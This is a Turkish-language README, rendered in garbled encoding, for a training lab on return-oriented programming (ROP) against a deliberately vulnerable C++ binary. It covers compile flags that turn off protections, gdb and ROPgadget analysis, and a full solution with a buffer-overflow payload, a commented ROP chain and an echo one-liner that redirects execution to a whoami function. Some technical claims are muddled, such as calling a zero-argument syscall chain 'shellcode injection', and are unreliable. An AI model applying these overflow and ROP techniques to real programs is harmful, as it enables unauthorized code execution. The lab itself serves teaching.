# CyberLabs: ROP (Return-Oriented Programming) Zafiyeti LaboratuvarÄ±

**ModÃ¼l Kodu:** CL-MEM-005

**Seviye:** Ä°leri

**Konu:** Modern Exploit Teknikleri ve Koruma Bypass

## LaboratuvarÄ±n AmacÄ±

Bu laboratuvar, CyberLabs eÄŸitim platformu iÃ§in hazÄ±rlanmÄ±ÅŸ olup, modern exploit tekniklerinden biri olan **Return-Oriented Programming (ROP)** konusunu ele almaktadÄ±r. KatÄ±lÄ±mcÄ±larÄ±n bu laboratuvar sonunda aÅŸaÄŸÄ±daki yetkinlikleri kazanmasÄ± hedeflenmektedir:

- ROP tekniÄŸinin temel prensiplerini ve NX bit korumasÄ±nÄ± nasÄ±l aÅŸtÄ±ÄŸÄ±nÄ± anlamak.
- Mevcut kod parÃ§alarÄ±nÄ± (gadget'larÄ±) kullanarak program akÄ±ÅŸÄ±nÄ± kontrol etmeyi Ã¶ÄŸrenmek.
- `objdump`, `gdb` ve `ROPgadget` gibi araÃ§larla gadget analizi yapmak.
- GerÃ§ek bir ROP chain oluÅŸturarak program akÄ±ÅŸÄ±nÄ± ele geÃ§irmeyi pratik olarak gÃ¶rmek.
- Modern koruma mekanizmalarÄ±nÄ± (NX, ASLR, Stack Canary) aÅŸma tekniklerini Ã¶ÄŸrenmek.

## Zorluk Seviyeleri

## ğŸŸ¢ **KOLAY YOL: Debug Sembolleri ile**
```bash
# test_lab.sh dosyasÄ±nda -g flag'ini ekleyin
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Debug sembolleri ile daha kolay analiz
- GDB'de `p &variable` komutlarÄ± Ã§alÄ±ÅŸÄ±r
- EÄŸitim amaÃ§lÄ± ideal

## ğŸ”´ **ZOR YOL: Debug Sembolleri Olmadan (VarsayÄ±lan)**
```bash
# Mevcut derleme (debug sembolleri yok)
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- GerÃ§ek dÃ¼nyaya daha yakÄ±n
- `info functions`, `disassemble` komutlarÄ± gerekir
- Production binary'lerde debug sembolleri yoktur

## ROP (Return-Oriented Programming) Nedir?

**Return-Oriented Programming (ROP)**, modern iÅŸletim sistemlerindeki **NX bit** (No-Execute) korumasÄ±nÄ± aÅŸmak iÃ§in geliÅŸtirilmiÅŸ bir exploit tekniÄŸidir. Bu teknik, saldÄ±rganÄ±n kendi shellcode'unu Ã§alÄ±ÅŸtÄ±rmasÄ± yerine, programda zaten mevcut olan kod parÃ§alarÄ±nÄ± (gadget'larÄ±) kullanarak program akÄ±ÅŸÄ±nÄ± kontrol etmesini saÄŸlar.

### ROP'un Temel Prensipleri:

1. **Gadget Bulma:** Programda `ret` komutu ile biten kÃ¼Ã§Ã¼k kod parÃ§alarÄ±nÄ± bulma
2. **Chain OluÅŸturma:** Bu gadget'larÄ± sÄ±ralÄ± olarak birleÅŸtirerek istenen iÅŸlevi gerÃ§ekleÅŸtirme
3. **Stack Manipulation:** Stack'i kullanarak gadget'lar arasÄ±nda veri aktarÄ±mÄ± yapma
4. **Return Address Overwrite:** Buffer overflow ile return address'i ilk gadget'Ä±n adresi ile deÄŸiÅŸtirme

### ROP AvantajlarÄ±:
- NX bit korumasÄ±nÄ± aÅŸar
- ASLR'Ä± aÅŸabilir (information leak ile)
- Stack Canary'yi aÅŸabilir
- GerÃ§ek kod kullanÄ±r, antivirus tarafÄ±ndan tespit edilmesi zor

## Disclaimer / Yasal UyarÄ±

Bu laboratuvar iÃ§eriÄŸi, tamamen **CyberLabs eÄŸitim ortamÄ±** iÃ§in tasarlanmÄ±ÅŸtÄ±r. Buradaki bilgi ve kodlarÄ±n amacÄ±, siber gÃ¼venlik uzmanlarÄ±nÄ±n savunma mekanizmalarÄ±nÄ± daha iyi anlamalarÄ±na ve zafiyet analizi yeteneklerini geliÅŸtirmelerine yardÄ±mcÄ± olmaktÄ±r.

### Yasak KullanÄ±mlar
- CyberLabs eÄŸitim ortamÄ± dÄ±ÅŸÄ±nda kullanÄ±m
- Yasa dÄ±ÅŸÄ± faaliyetler veya yetkisiz sistem eriÅŸimi
- GerÃ§ek sistemlerin kÃ¶tÃ¼ niyetli sÃ¶mÃ¼rÃ¼lmesi
- EÄŸitim dÄ±ÅŸÄ± amaÃ§larla daÄŸÄ±tÄ±m

### Sorumluluk
Bu materyallerin CyberLabs ortamÄ± dÄ±ÅŸÄ±nda veya yasa dÄ±ÅŸÄ± amaÃ§larla kullanÄ±lmasÄ± kesinlikle yasaktÄ±r ve tÃ¼m sorumluluk kullanÄ±cÄ±ya aittir. Yazarlar ve CyberLabs, bu eÄŸitim materyallerinin kÃ¶tÃ¼ye kullanÄ±mÄ±ndan sorumlu deÄŸildir.

## Senaryo

Laboratuvar senaryosu, iki ana bileÅŸenden oluÅŸmaktadÄ±r:

1. **`vulnerable_code.cpp`:** Ä°Ã§erisinde kasÄ±tlÄ± olarak bir buffer overflow zafiyeti barÄ±ndÄ±ran, C++ ile yazÄ±lmÄ±ÅŸ hedef uygulama. NX bit korumasÄ± aktif olmasÄ±na raÄŸmen ROP ile sÃ¶mÃ¼rÃ¼lebilir.

2. **`exploit.py`:** Zafiyetli uygulamadaki aÃ§Ä±ÄŸÄ± kullanarak ROP chain oluÅŸturan ve program akÄ±ÅŸÄ±nÄ± ele geÃ§iren Python exploit script'i.

## Platform UyumluluÄŸu

Bu lab hem **Linux (x86_64)** hem de **macOS (ARM64)** platformlarÄ±nda Ã§alÄ±ÅŸÄ±r:

### ğŸ§ **Linux x86_64**
- GerÃ§ek ROP chain kullanÄ±r
- x86_64 assembly gadget'larÄ±
- NX bit bypass teknikleri
- Production benzeri ortam

### ğŸ **macOS ARM64**
- EÄŸitim amaÃ§lÄ± basit ROP chain
- ARM64 mimarisi farklÄ±lÄ±klarÄ±
- Platform-specific optimizasyonlar
- GeliÅŸtirme ortamÄ±

## Kurulum ve Ã‡alÄ±ÅŸtÄ±rma AdÄ±mlarÄ±

### 1. Zafiyetli Kodu Derleme

```bash
# Otomatik derleme (platform detection ile)
./compile_linux.sh

# Linux iÃ§in manuel derleme
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp

# macOS iÃ§in manuel derleme
g++ -m64 -fno-stack-protector -no-pie -Wno-unused-result -Wno-shift-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

**Derleme BayraklarÄ± AÃ§Ä±klamasÄ±:**
- `-m64`: 64-bit derleme
- `-fno-stack-protector`: Stack canary korumasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak
- `-z execstack`: Stack'i executable yap (bazÄ± ROP teknikleri iÃ§in)
- `-no-pie`: Position Independent Executable'Ä± devre dÄ±ÅŸÄ± bÄ±rak
- `-Wno-unused-result`: KullanÄ±lmayan sonuÃ§ uyarÄ±larÄ±nÄ± bastÄ±r
- `-Wno-stringop-overflow`: String overflow uyarÄ±larÄ±nÄ± bastÄ±r

### 2. ROP Gadget'larÄ±nÄ± Analiz Etme

```bash
# Objdump ile gadget'larÄ± bulma
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"

# ROPgadget aracÄ± ile (eÄŸer yÃ¼klÃ¼yse)
ROPgadget --binary compiled/vulnerable_code --ropchain
```

### 3. GDB ile Dinamik Analiz

```bash
gdb ./compiled/vulnerable_code
(gdb) info functions
(gdb) disassemble win_function
(gdb) disassemble gadget_pop_rdi
(gdb) break vulnerable_function
(gdb) run
```

### 4. Exploit Ã‡alÄ±ÅŸtÄ±rma

```bash
# Otomatik test
./test_lab.sh

# Manuel exploit
python3 source_code/exploit.py
```

## ROP Chain YapÄ±sÄ±

Bu laboratuvarda kullanÄ±lan ROP chain yapÄ±sÄ±:

### ğŸ§ **Linux x86_64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
â”œâ”€â”€ pop rdi; ret (gadget)
â”œâ”€â”€ 0x0 (rdi deÄŸeri)
â”œâ”€â”€ pop rsi; ret (gadget)  
â”œâ”€â”€ 0x0 (rsi deÄŸeri)
â”œâ”€â”€ pop rdx; ret (gadget)
â”œâ”€â”€ 0x0 (rdx deÄŸeri)
â”œâ”€â”€ syscall; ret (gadget)
â””â”€â”€ execute_whoami (shellcode enjeksiyonu)
```

### ğŸ **macOS ARM64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
â””â”€â”€ execute_whoami (basit komut enjeksiyonu)
```

### ğŸ’» **Shellcode Enjeksiyonu:**
- **Linux:** GerÃ§ek ROP chain ile `system("whoami")` Ã§aÄŸrÄ±sÄ±
- **macOS:** Basit fonksiyon Ã§aÄŸrÄ±sÄ± ile `system("whoami")` Ã§alÄ±ÅŸtÄ±rma
- **Hedef:** Sistem komutlarÄ±nÄ± ROP ile Ã§alÄ±ÅŸtÄ±rma

## Ã–ÄŸrenme Hedefleri

### Temel Seviye:
- ROP tekniÄŸinin ne olduÄŸunu anlama
- Gadget kavramÄ±nÄ± Ã¶ÄŸrenme
- Basit ROP chain oluÅŸturma

### Orta Seviye:
- NX bit korumasÄ±nÄ± aÅŸma
- Stack manipulation teknikleri
- Register deÄŸerlerini kontrol etme

### Ä°leri Seviye:
- KarmaÅŸÄ±k ROP chain'leri
- ASLR bypass teknikleri
- Real-world ROP exploit'leri

## Gerekli AraÃ§lar

- **GDB:** Dinamik analiz ve debugging
- **objdump:** Statik analiz ve gadget bulma
- **ROPgadget:** Otomatik gadget analizi (opsiyonel)
- **pwntools:** Python exploit geliÅŸtirme
- **hexdump:** Binary veri analizi

## Troubleshooting

### YaygÄ±n Sorunlar:

1. **"Permission denied" hatasÄ±:**
   ```bash
   chmod +x compiled/vulnerable_code
   ```

2. **"Address not found" hatasÄ±:**
   - GDB ile adresleri manuel bulun
   - `info functions` komutunu kullanÄ±n

3. **"ROP chain failed" hatasÄ±:**
   - Gadget adreslerini kontrol edin
   - Stack alignment'Ä± kontrol edin

## Tam Ã‡Ã¶zÃ¼m (GDB ile Adres Bulma)

### 1. GDB ile Adres Bulma

```bash
# Binary'yi GDB ile aÃ§
gdb ./compiled/vulnerable_code

# Fonksiyon adreslerini bul
(gdb) info functions
(gdb) info functions win_function
(gdb) info functions execute_whoami
(gdb) info functions gadget_pop_rdi
(gdb) info functions gadget_pop_rsi
(gdb) info functions gadget_pop_rdx
(gdb) info functions gadget_syscall

# GerÃ§ek adresler (Linux x86_64):
# win_function: 0x401166
# execute_whoami: 0x401220
# gadget_pop_rdi: 0x401323
# gadget_pop_rsi: 0x40133a
# gadget_pop_rdx: 0x401351
# gadget_syscall: 0x401368

# ROPgadget ile bulunan gerÃ§ek gadget'lar:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c
# pop rdx; ret: 0x401395
# syscall: 0x40139e

# Disassembly ile gadget'larÄ± incele
(gdb) disassemble win_function
(gdb) disassemble execute_whoami
(gdb) disassemble gadget_pop_rdi
(gdb) disassemble gadget_pop_rsi
(gdb) disassemble gadget_pop_rdx
(gdb) disassemble gadget_syscall

# Buffer overflow'u test et
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) continue

# DetaylÄ± dinamik analiz
(gdb) break vulnerable_function
(gdb) run
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
(gdb) disassemble vulnerable_function
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 2. GDB ile DetaylÄ± Dinamik Analiz

#### 2.1. Temel Analiz
```bash
# Binary'yi GDB ile aÃ§
gdb ./compiled/vulnerable_code

# ProgramÄ± Ã§alÄ±ÅŸtÄ±r ve breakpoint koy
(gdb) break vulnerable_function
(gdb) run

# Register'larÄ± incele
(gdb) info registers
(gdb) info all-registers

# Stack durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
```

#### 2.2. Buffer Overflow Analizi
```bash
# vulnerable_function'da breakpoint
(gdb) break vulnerable_function
(gdb) run

# Stack layout'Ä±nÄ± incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp+0x40

# Buffer'Ä±n adresini bul
(gdb) disassemble vulnerable_function
(gdb) x/32gx $rsp+0x8

# Return address'i bul
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.3. ROP Chain Testi
```bash
# Payload ile test
(gdb) run
# Payload'Ä± manuel olarak gir:
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# Stack'i incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Return address'in deÄŸiÅŸip deÄŸiÅŸmediÄŸini kontrol et
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.4. Gadget Analizi
```bash
# Gadget'larÄ± tek tek test et
(gdb) break gadget_pop_rdi
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers

# execute_whoami fonksiyonunu test et
(gdb) break execute_whoami
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) continue
```

#### 2.5. Memory Layout Analizi
```bash
# Memory mapping'i incele
(gdb) info proc mappings
(gdb) info files
(gdb) info target

# Stack ve heap durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x100
```

#### 2.6. GeliÅŸmiÅŸ GDB Teknikleri
```bash
# Conditional breakpoint'ler
(gdb) break vulnerable_function if $rsp == 0x7fffffffe000
(gdb) break execute_whoami if $rdi == 0x401220

# Watchpoint'ler
(gdb) watch *0x7fffffffe048
(gdb) watch $rsp+0x48

# TUI modunda analiz
(gdb) layout asm
(gdb) layout regs
(gdb) layout split

# Script ile otomatik analiz
(gdb) define analyze_rop
> break vulnerable_function
> run
> x/32gx $rsp
> x/gx $rsp+0x48
> continue
> end
(gdb) analyze_rop
```

#### 2.7. ROP Chain Debugging
```bash
# ROP chain'i adÄ±m adÄ±m debug et
(gdb) break vulnerable_function
(gdb) run
# Payload'Ä± gir
(gdb) x/32gx $rsp
(gdb) x/gx $rsp+0x48
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

#### 2.8. Exploit DoÄŸrulama
```bash
# Exploit'in Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol et
(gdb) break execute_whoami
(gdb) run
# Payload'Ä± gir
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers
(gdb) continue
```

#### 2.9. GDB Script Ã–rnekleri
```bash
# ROP analizi iÃ§in GDB script
(gdb) define rop_analysis
> echo === ROP Analysis Started ===\n
> break vulnerable_function
> run
> echo === Stack State ===\n
> x/32gx $rsp
> echo === Return Address ===\n
> x/gx $rsp+0x48
> echo === Buffer Content ===\n
> x/32gx $rsp+0x8
> echo === Analysis Complete ===\n
> end

# Gadget test script
(gdb) define test_gadgets
> echo === Testing Gadgets ===\n
> break gadget_pop_rdi
> run
> x/32gx $rsp
> stepi
> info registers
> break gadget_pop_rsi
> continue
> x/32gx $rsp
> stepi
> info registers
> end
```

#### 2.10. Hata AyÄ±klama Teknikleri
```bash
# Segmentation fault analizi
(gdb) run
# Program crash olduÄŸunda
(gdb) bt
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Stack corruption kontrolÃ¼
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 3. ROP Chain OluÅŸturma

#### Linux x86_64 iÃ§in:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain - sadece execute_whoami fonksiyonunu Ã§aÄŸÄ±r
payload += p64(0x401220)        # execute_whoami fonksiyonu

# Alternatif: GerÃ§ek ROP chain (geliÅŸmiÅŸ)
# payload += p64(0x401383)        # pop rdi; ret
# payload += p64(0x0)             # rdi deÄŸeri
# payload += p64(0x40138c)        # pop rsi; ret  
# payload += p64(0x0)             # rsi deÄŸeri
# payload += p64(0x401395)        # pop rdx; ret
# payload += p64(0x0)             # rdx deÄŸeri
# payload += p64(0x40139e)        # syscall
# payload += p64(0x401220)        # execute_whoami fonksiyonu
```

#### macOS ARM64 iÃ§in:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain (ARM64 farklÄ±)
payload += p64(whoami_addr)     # execute_whoami fonksiyonu
```

### 3. Exploit Ã‡alÄ±ÅŸtÄ±rma

```bash
# Exploit'i Ã§alÄ±ÅŸtÄ±r
python3 source_code/exploit.py

# Manuel test (Linux x86_64)
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code

# ROPgadget ile gadget'larÄ± bul
ROPgadget --binary compiled/vulnerable_code --ropchain

# Belirli gadget'larÄ± ara
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"
```

### 4. Beklenen SonuÃ§

```
Shellcode Enjeksiyonu Basarili!
'whoami' komutu calistiriliyor...
[kullanici_adi]
Komut basariyla calistirildi!

ROP ile sistem komutu basariyla enjekte edildi!
```

## Ä°leri Seviye Konular

- **ASLR Bypass:** Information leak ile ASLR'Ä± aÅŸma
- **Stack Pivot:** Stack pointer'Ä± manipÃ¼le etme
- **JOP (Jump-Oriented Programming):** ROP'un alternatifi
- **COP (Call-Oriented Programming):** Call instruction'larÄ± kullanma
- **ROP Chain Optimization:** Daha verimli chain'ler oluÅŸturma

## Kaynaklar

- [ROP Emporium](https://ropemporium.com/) - ROP Ã¶ÄŸrenme platformu
- [Phrack ROP Article](http://phrack.org/issues/58/4.html) - ROP'un temel makalesi
- [ROPgadget Documentation](https://github.com/JonathanSalwan/ROPgadget) - Gadget analiz aracÄ±
- [pwntools Documentation](https://docs.pwntools.com/) - Exploit geliÅŸtirme kÃ¼tÃ¼phanesi

## KatkÄ±da Bulunma

Bu laboratuvarÄ± geliÅŸtirmek iÃ§in:
1. Fork yapÄ±n
2. Yeni Ã¶zellik ekleyin
3. Pull request gÃ¶nderin

## Lisans

Bu proje MIT lisansÄ± altÄ±nda lisanslanmÄ±ÅŸtÄ±r.

## Ä°letiÅŸim

- **CyberLabs:** [GitHub](https://github.com/CyberLabs)
- **E-posta:** info@cyberlabs.com
- **Web:** https://cyberlabs.com
